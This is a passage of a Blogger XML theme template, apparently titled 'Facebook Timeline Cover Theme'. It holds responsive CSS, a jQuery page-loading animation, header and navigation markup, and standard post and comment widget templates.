.post-body{margin:0 0 .75em;text-align:justify;padding-top:8px;color:#555;line-height:24px;text-shadow:1px 1px 0px #fff;}
.post-body blockquote{overflow:hidden;padding:10px 10px 10px 10px;color:#59666f;font-style:normal;}
.post-footer{margin:.75em 0;color:$sidebarcolor;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;line-height:1.4em}
.comment-link{margin-$startSide:.6em}
.post img{padding:0px;margin:0 4px 4px 0}
#blog-pager-newer-link{float:$startSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
#blog-pager-older-link{float:$endSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
.home-link{background:#3B5997;border:1px solid #D5D5D5;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;margin-top:6px;}
#blog-pager{text-align:center;position:relative;}
.feed-links{clear:both;line-height:2.5em}
.profile-img{float:$startSide;margin-top:0;margin-$endSide:5px;margin-bottom:5px;margin-$startSide:0;padding:4px;border:1px solid $bordercolor}
.profile-data{margin:0;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;color:$sidebarcolor;font-weight:bold;line-height:1.6em}
.profile-datablock{margin:.5em 0 .5em}
.profile-textblock{margin:0.5em 0;line-height:1.6em}
.profile-link{font:$postfooterfont;text-transform:uppercase;letter-spacing:.1em}
#navbar-iframe{height:0;visibility:hidden;display:none;}
#footer{padding:5px 0 10px 0;color:#fff;font-size:12px;width:100%;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{float:left;text-align:left;margin:10px 0 10px 20px;line-height:20px}
.fright{float:right;text-align:right;margin:10px 20px 10px 0;line-height:20px}
.frss{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSwalBT0I/AAAAAAAAAmc/MbeHvqTVOyw/s000/rss.png) no-repeat;padding-left:20px}
.ftwit{background:url(http://4.bp.blogspot.com/_xpQK9GsnDPs/TOxSw3ze4HI/AAAAAAAAAmg/4LQBbU-hpUk/s000/twitter.png) no-repeat;padding-left:20px}
#bottom{margin:0 auto;border:1px solid #D5D5D5}
.bottomcover{background:#fff;margin:0 auto;width:100%}
h3.bothead{height:20px;font-size:18px;padding:10px 0 10px 5px;color:#fff}
li.botwid{float:left;width:230px;padding-bottom:10px;font:12px Arial,Tahoma,Century gothic,sans-serif;margin:30px 0 0 15px;color:#ddd;list-style:none}
.botwid ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.botwid li{list-style-type:none;margin:0;padding:0}
.botwid ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.botwid ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul li{height:100%;line-height:18px;clear:left;width:230px;list-style-type:none}
.botwid ul li a:link,.botwid ul li a:visited{color:#555;text-decoration:none;padding:5px 0 5px 5px;display:block;border-bottom:1px solid #171717}
.botwid ul li a:hover{color:#999}
.botwid p{padding:7px 10px;margin:0}
.botwid table{width:100%;text-align:center;color:#787d7f}
#search{background:url(images/search.png);width:273px;padding:5px 0;margin:10px 0 0 0;height:50px;display:inline}
#search form{margin:0 0 0 0;padding:0}
#search fieldset{margin:0;padding:0;border:none}
#search p{margin:0;font-size:85%}
#s{width:275px;margin:10px 0 0 0;padding:5px 5px;height:16px;border:none;font:normal 100% &quot;Tahoma&quot;,Arial,Helvetica,sans-serif;color:#333;border:1px solid #ddd;background:#F3F3F3;display:inline}
input#searchsubmit{padding:3px 5px;display:inline;margin:0 0 0 0;height:26px;background:#133E68;color:#fff;border:none}
#topbox{display:inline-block;width:100%;padding:10px 0 50px 0;margin:0px auto;}
.widleft{width:320px;float:left;margin-right:20px}
.widright{float:right!important;margin-right:0!important}
.widleft h2{color:#1a6014;font-size:18px;padding:5px 0}
.widleft p{color:#555;line-height:20px}
.widleft img{float:left;margin:5px 10px 5px 0}
.postmeta{border-top:1px dashed #ddd;border-bottom:1px dashed #ddd;padding:2px 0}
.author{color:#3B5998;padding:2px 5px 2px 5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.clock{color:#3B5998;padding:2px 5px 2px 0;text-transform:uppercase;font-size:10px}
.comm{color:#3B5998;padding:2px 5px 2px 0;margin-left:5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.comm a:link,.comm a:visited{color:#3B5998}
.comm a:hover{color:#000;text-shadow:1px 1px 1px #ccc}
.singleinfo{text-transform:uppercase;padding:5px 5px}
.rmore{padding:5px 0 5px 5px;color:#3B5997;font-weight:bold}
.rmore a:link,.rmore a:visited{color:#ff6c14}
.categ{padding:5px 0 5px 5px;color:#000;font-size:10px}
.categ a:link,.categ a:visited{color:#3B5997}
.categ a:hover{color:#000}
.sidebox{width:288px;padding:10px;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebox ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.sidebox li{list-style-type:none;margin:0;padding:0}
.sidebox ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.sidebox ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul li{height:100%;line-height:18px;clear:left;width:295px;margin:0 0;list-style-type:none}
.sidebox ul li a:link,.sidebox ul li a:visited{color:#6f6f6f;border-bottom:1px dotted #ddd;text-decoration:none;padding:5px 0 5px 10px;display:block}
.sidebox ul li a:hover{color:#000}
.sidebox p{padding:7px 10px;margin:0}
.sidebox table{width:100%;text-align:center;color:#787d7f}
h3.sidetitl{background:#F2F2F2;border:1px solid #D5D5D5;color:#3D5A99;height:35px;padding-left:10px;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;}
}

@media screen and (max-width : 480px) {

#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:100%;margin:10px auto;position:relative;box-shadow:0 0 10px #111;-moz-box-shadow:0 0 10px #111;-webkit-box-shadow:0 0 10px #111;padding:0 0;text-align:$startSide;font:$bodyfont}
#content-wrapper{width:100%;margin:0 auto;background:#fff;}
#main-wrapper{float:center;width:100%;height:100%;padding:10px 0 0 0;margin:10px 0 0 20px;display:inline;overflow:hidden;word-wrap:break-word;overflow:hidden;}
#rsidebar-wrapper{width:100%;display:none;margin-top:20px;margin-right:20px;word-wrap:break-word;overflow:hidden;}
h2.date-header{margin:1.5em 0 .5em}
.wrapfullpost{margin:0px;padding:0px;}
.post{margin:0 0 20px 0;height:100%;color:#555;padding:5px 14px 5px 14px;border:1px solid #d5d5d5;color:#222;}
.post-body{margin:0 0 .75em;text-align:justify;padding-top:8px;color:#555;line-height:24px;text-shadow:1px 1px 0px #fff;}
.post-body blockquote{overflow:hidden;padding:10px 10px 10px 10px;color:#59666f;font-style:normal;}
.post-footer{margin:.75em 0;color:$sidebarcolor;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;line-height:1.4em}
.comment-link{margin-$startSide:.6em}
.post img{padding:0px;margin:0 4px 4px 0}
#blog-pager-newer-link{float:$startSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
#blog-pager-older-link{float:$endSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
.home-link{background:#3B5997;border:1px solid #D5D5D5;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;margin-top:6px;}
#blog-pager{text-align:center;position:relative;}
.feed-links{clear:both;line-height:2.5em}
.profile-img{float:$startSide;margin-top:0;margin-$endSide:5px;margin-bottom:5px;margin-$startSide:0;padding:4px;border:1px solid $bordercolor}
.profile-data{margin:0;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;color:$sidebarcolor;font-weight:bold;line-height:1.6em}
.profile-datablock{margin:.5em 0 .5em}
.profile-textblock{margin:0.5em 0;line-height:1.6em}
.profile-link{font:$postfooterfont;text-transform:uppercase;letter-spacing:.1em}
#navbar-iframe{height:0;visibility:hidden;display:none;}
#footer{padding:5px 0 10px 0;color:#fff;font-size:12px;width:100%;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{float:left;text-align:left;margin:10px 0 10px 20px;line-height:20px}
.fright{float:right;text-align:right;margin:10px 20px 10px 0;line-height:20px}
.frss{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSwalBT0I/AAAAAAAAAmc/MbeHvqTVOyw/s000/rss.png) no-repeat;padding-left:20px}
.ftwit{background:url(http://4.bp.blogspot.com/_xpQK9GsnDPs/TOxSw3ze4HI/AAAAAAAAAmg/4LQBbU-hpUk/s000/twitter.png) no-repeat;padding-left:20px}
#bottom{margin:0 auto;border:1px solid #D5D5D5}
.bottomcover{background:#fff;margin:0 auto;width:100%}
h3.bothead{height:20px;font-size:18px;padding:10px 0 10px 5px;color:#fff}
li.botwid{float:left;width:230px;padding-bottom:10px;font:12px Arial,Tahoma,Century gothic,sans-serif;margin:30px 0 0 15px;color:#ddd;list-style:none}
.botwid ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.botwid li{list-style-type:none;margin:0;padding:0}
.botwid ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.botwid ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul li{height:100%;line-height:18px;clear:left;width:230px;list-style-type:none}
.botwid ul li a:link,.botwid ul li a:visited{color:#555;text-decoration:none;padding:5px 0 5px 5px;display:block;border-bottom:1px solid #171717}
.botwid ul li a:hover{color:#999}
.botwid p{padding:7px 10px;margin:0}
.botwid table{width:100%;text-align:center;color:#787d7f}
#search{background:url(images/search.png);width:273px;padding:5px 0;margin:10px 0 0 0;height:50px;display:inline}
#search form{margin:0 0 0 0;padding:0}
#search fieldset{margin:0;padding:0;border:none}
#search p{margin:0;font-size:85%}
#s{width:275px;margin:10px 0 0 0;padding:5px 5px;height:16px;border:none;font:normal 100% &quot;Tahoma&quot;,Arial,Helvetica,sans-serif;color:#333;border:1px solid #ddd;background:#F3F3F3;display:inline}
input#searchsubmit{padding:3px 5px;display:inline;margin:0 0 0 0;height:26px;background:#133E68;color:#fff;border:none}
#topbox{display:inline-block;width:100%;padding:10px 0 50px 0;margin:0px auto;}
.widleft{width:320px;float:left;margin-right:20px}
.widright{float:right!important;margin-right:0!important}
.widleft h2{color:#1a6014;font-size:18px;padding:5px 0}
.widleft p{color:#555;line-height:20px}
.widleft img{float:left;margin:5px 10px 5px 0}
.postmeta{border-top:1px dashed #ddd;border-bottom:1px dashed #ddd;padding:2px 0}
.author{color:#3B5998;padding:2px 5px 2px 5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.clock{color:#3B5998;padding:2px 5px 2px 0;text-transform:uppercase;font-size:10px}
.comm{color:#3B5998;padding:2px 5px 2px 0;margin-left:5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.comm a:link,.comm a:visited{color:#3B5998}
.comm a:hover{color:#000;text-shadow:1px 1px 1px #ccc}
.singleinfo{text-transform:uppercase;padding:5px 5px}
.rmore{padding:5px 0 5px 5px;color:#3B5997;font-weight:bold}
.rmore a:link,.rmore a:visited{color:#ff6c14}
.categ{padding:5px 0 5px 5px;color:#000;font-size:10px}
.categ a:link,.categ a:visited{color:#3B5997}
.categ a:hover{color:#000}
.sidebox{width:288px;padding:10px;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebox ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.sidebox li{list-style-type:none;margin:0;padding:0}
.sidebox ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.sidebox ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul li{height:100%;line-height:18px;clear:left;width:295px;margin:0 0;list-style-type:none}
.sidebox ul li a:link,.sidebox ul li a:visited{color:#6f6f6f;border-bottom:1px dotted #ddd;text-decoration:none;padding:5px 0 5px 10px;display:block}
.sidebox ul li a:hover{color:#000}
.sidebox p{padding:7px 10px;margin:0}
.sidebox table{width:100%;text-align:center;color:#787d7f}
h3.sidetitl{background:#F2F2F2;border:1px solid #D5D5D5;color:#3D5A99;height:35px;padding-left:10px;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;}
}

@media screen and (max-width : 320px) {

#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:100%;margin:10px auto;position:relative;box-shadow:0 0 10px #111;-moz-box-shadow:0 0 10px #111;-webkit-box-shadow:0 0 10px #111;padding:0 0;text-align:$startSide;font:$bodyfont}
#content-wrapper{width:100%;margin:0 auto;background:#fff;}
#main-wrapper{float:center;width:100%;height:100%;padding:10px 0 0 0;margin:10px 0 0 20px;display:inline;overflow:hidden;word-wrap:break-word;overflow:hidden;}
#rsidebar-wrapper{width:100%;display:none;margin-top:20px;margin-right:20px;word-wrap:break-word;overflow:hidden;}
h2.date-header{margin:1.5em 0 .5em}
.wrapfullpost{margin:0px;padding:0px;}
.post{margin:0 0 20px 0;height:100%;color:#555;padding:5px 14px 5px 14px;border:1px solid #d5d5d5;color:#222;}
.post-body{margin:0 0 .75em;text-align:justify;padding-top:8px;color:#555;line-height:24px;text-shadow:1px 1px 0px #fff;}
.post-body blockquote{overflow:hidden;padding:10px 10px 10px 10px;color:#59666f;font-style:normal;}
.post-footer{margin:.75em 0;color:$sidebarcolor;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;line-height:1.4em}
.comment-link{margin-$startSide:.6em}
.post img{padding:0px;margin:0 4px 4px 0}
#blog-pager-newer-link{float:$startSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
#blog-pager-older-link{float:$endSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
.home-link{background:#3B5997;border:1px solid #D5D5D5;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;margin-top:6px;}
#blog-pager{text-align:center;position:relative;}
.feed-links{clear:both;line-height:2.5em}
.profile-img{float:$startSide;margin-top:0;margin-$endSide:5px;margin-bottom:5px;margin-$startSide:0;padding:4px;border:1px solid $bordercolor}
.profile-data{margin:0;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;color:$sidebarcolor;font-weight:bold;line-height:1.6em}
.profile-datablock{margin:.5em 0 .5em}
.profile-textblock{margin:0.5em 0;line-height:1.6em}
.profile-link{font:$postfooterfont;text-transform:uppercase;letter-spacing:.1em}
#navbar-iframe{height:0;visibility:hidden;display:none;}
#footer{color:#fff;font-size:12px;width:100%;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{display:none;}
.fright{text-align:center;float:center;}
#bottom{margin:0 auto;border:1px solid #D5D5D5}
.bottomcover{background:#fff;margin:0 auto;width:100%}
h3.bothead{height:20px;font-size:18px;padding:10px 0 10px 5px;color:#fff}
li.botwid{float:left;width:230px;padding-bottom:10px;font:12px Arial,Tahoma,Century gothic,sans-serif;margin:30px 0 0 15px;color:#ddd;list-style:none}
.botwid ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.botwid li{list-style-type:none;margin:0;padding:0}
.botwid ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.botwid ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul li{height:100%;line-height:18px;clear:left;width:230px;list-style-type:none}
.botwid ul li a:link,.botwid ul li a:visited{color:#555;text-decoration:none;padding:5px 0 5px 5px;display:block;border-bottom:1px solid #171717}
.botwid ul li a:hover{color:#999}
.botwid p{padding:7px 10px;margin:0}
.botwid table{width:100%;text-align:center;color:#787d7f}
#search{background:url(images/search.png);width:273px;padding:5px 0;margin:10px 0 0 0;height:50px;display:inline}
#search form{margin:0 0 0 0;padding:0}
#search fieldset{margin:0;padding:0;border:none}
#search p{margin:0;font-size:85%}
#s{width:275px;margin:10px 0 0 0;padding:5px 5px;height:16px;border:none;font:normal 100% &quot;Tahoma&quot;,Arial,Helvetica,sans-serif;color:#333;border:1px solid #ddd;background:#F3F3F3;display:inline}
input#searchsubmit{padding:3px 5px;display:inline;margin:0 0 0 0;height:26px;background:#133E68;color:#fff;border:none}
#topbox{display:inline-block;width:100%;padding:10px 0 50px 0;margin:0px auto;}
.widleft{width:320px;float:left;margin-right:20px}
.widright{float:right!important;margin-right:0!important}
.widleft h2{color:#1a6014;font-size:18px;padding:5px 0}
.widleft p{color:#555;line-height:20px}
.widleft img{float:left;margin:5px 10px 5px 0}
.postmeta{border-top:1px dashed #ddd;border-bottom:1px dashed #ddd;padding:2px 0}
.author{color:#3B5998;padding:2px 5px 2px 5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.clock{color:#3B5998;padding:2px 5px 2px 0;text-transform:uppercase;font-size:10px}
.comm{color:#3B5998;padding:2px 5px 2px 0;margin-left:5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.comm a:link,.comm a:visited{color:#3B5998}
.comm a:hover{color:#000;text-shadow:1px 1px 1px #ccc}
.singleinfo{text-transform:uppercase;padding:5px 5px}
.rmore{padding:5px 0 5px 5px;color:#3B5997;font-weight:bold}
.rmore a:link,.rmore a:visited{color:#ff6c14}
.categ{padding:5px 0 5px 5px;color:#000;font-size:10px}
.categ a:link,.categ a:visited{color:#3B5997}
.categ a:hover{color:#000}
.sidebox{width:288px;padding:10px;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebox ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.sidebox li{list-style-type:none;margin:0;padding:0}
.sidebox ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.sidebox ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul li{height:100%;line-height:18px;clear:left;width:295px;margin:0 0;list-style-type:none}
.sidebox ul li a:link,.sidebox ul li a:visited{color:#6f6f6f;border-bottom:1px dotted #ddd;text-decoration:none;padding:5px 0 5px 10px;display:block}
.sidebox ul li a:hover{color:#000}
.sidebox p{padding:7px 10px;margin:0}
.sidebox table{width:100%;text-align:center;color:#787d7f}
h3.sidetitl{background:#F2F2F2;border:1px solid #D5D5D5;color:#3D5A99;height:35px;padding-left:10px;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;}
}

@media screen and (max-width : 240px) {

#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:100%;}
#content-wrapper{width:100%;background:#fff;}
#main-wrapper{float:center;width:100%;height:100%;}
#topbox{display:inline-block;width:100%;padding:10px 0 50px 0;margin:0px auto;}
#footer{color:#fff;font-size:12px;width:100%;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{display:none;}
.fright{text-align:center;}
}

@media screen and (max-width : 500px) {
.fleft{display:none;}
.fright{text-align:center;float;center;}
}
@media only screen and (min-width: 900px){ 
   a.no {
      display:none;
    }
}
 @media only screen and (max-width: 900px){ 
   a.group1 {
      display:none;
    }
}
</style>
<script src='http://code.jquery.com/jquery-1.7.1.min.js' type='text/javascript'/>

<script>

(function($){

$(&quot;html&quot;).removeClass(&quot;MD&quot;); 


$(&quot;#footer&quot;).ready(function(){ $(&quot;#md-progress-bar&quot;).stop().animate({ width: &quot;75%&quot; },1500) });


$(window).load(function(){

    $(&quot;#md-progress-bar&quot;).stop().animate({ width: &quot;100%&quot; },600,function(){
        $(&quot;#md-loading&quot;).fadeOut(&quot;fast&quot;,function(){ $(this).remove(); });
    });

});
})(jQuery);
</script>

  </head>

  <body>
<b:if cond='data:blog.url != data:blog.homepageUrl'>
<div id='md-loading'><div id='md-progress-bar'/><div id='md-loader'>Loading...</div></div></b:if>
  <div id='body-wrapper'>


<div id='outer-wrapper'><div id='wrap2'>

     <div id='header-wrapper'>
      <b:section class='header' id='header' maxwidgets='1' showaddelement='no'>
        <b:widget id='Header1' locked='true' title='Facebook Timeline Cover Theme (Header)' type='Header'>
          <b:includable id='main'>

  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;REPLACE&quot;'>
      <!--Show just the image, no text-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl'>
          <img expr:alt='data:title' expr:src='data:sourceUrl'/>
        </a>
      </div>
    <b:else/>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <div id='header-inner'>
        <div class='titlewrapper' style='background: transparent'>
          <h1 class='title' style='background: transparent; border-width: 0px'>
            <b:include name='title'/>
          </h1>
        </div>
        <b:include name='description'/>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
      <img src='http://1.bp.blogspot.com/-GNQ0yLJrMRw/UsQyO8YbbAI/AAAAAAAABLE/dg4ol_4YXsk/s1600/Untitled-2.png' width='100%'/>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
          <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
          <b:includable id='title'>
<a expr:href='data:blog.homepageUrl'><data:title/></a>
</b:includable>
        </b:widget>
      </b:section>
<div style='clear:both;'/>
</div>
<div style='clear:both;'/>


<nav class='clearfix'><ul class='clearfix'>

	<li><a href='/'>Home</a></li>
	<li><a href='#'>Menu 1</a></li>
	<li><a href='#'>Menu 2</a></li>
	<li><a href='#'>Menu 3</a></li>
	<li><a href='#'>Menu 4</a></li>
	<li><a href='#'>Menu 5</a></li>	

</ul><a href='#' id='pull'>Menu</a></nav><div style='clear:both;'/>
 
    <div id='crosscol-wrapper' style='text-align:center'>
        <b:section class='crosscol' id='crosscol' showaddelement='yes'/>
      </div>

      <div id='main-wrapper'>

        <b:section class='main' id='main' showaddelement='no'>
          <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'>
            <b:includable id='main' var='top'>
  <b:if cond='data:mobile == &quot;false&quot;'>

    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <data:defaultAdStart/>
      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.isDateStart'>
          <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
            &lt;/div&gt;&lt;/div&gt;
          </b:if>
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-outer&quot;&gt;
        </b:if>
        <b:if cond='data:post.dateHeader'>
         
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-posts&quot;&gt;
        </b:if>
        <div class='post-outer'>
        <b:include data='post' name='post'/>
        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        </div>
        <b:if cond='data:post.includeAd'>
          <b:if cond='data:post.isFirstPost'>
            <data:defaultAdEnd/>
          <b:else/>
            <data:adEnd/>
          </b:if>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
          <data:adStart/>
        </b:if>
      </b:loop>
      <b:if cond='data:numPosts != 0'>
        &lt;/div&gt;&lt;/div&gt;
      </b:if>
      <data:adEnd/>
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>

    <!-- feed links -->
   

    <b:if cond='data:top.showStars'>
      <script src='//www.google.com/jsapi' type='text/javascript'/>
      <script type='text/javascript'>
        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
        function initialize() {
          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
          google.annotations.createAll();
          google.annotations.fetch();
        }
        google.setOnLoadCallback(initialize);
      </script>
    </b:if>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:if cond='data:top.showDummy'>
    <data:top.dummyBootstrap/>
  </b:if>

</b:includable>
            <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='//www.blogger.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
            <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
            <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <h4 id='comment-post-message'>
        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'><data:postCommentMsg/></a></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'><data:postCommentMsg/></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
            <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='//www.blogger.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
            <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.canonicalUrl'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
            <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:else/>
    <b:if cond='data:post.showThreadedComments'>
      <b:include data='post' name='threaded_comments'/>
    <b:else/>
      <b:include data='post' name='comments'/>
    </b:if>
  </b:if>
</b:includable>
            <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <b:if cond='data:post.allowComments'>
      <h4><data:post.commentLabelFull/>:</h4>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <b:if cond='data:post.hasOlderLinks'>
            <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
              &#160;
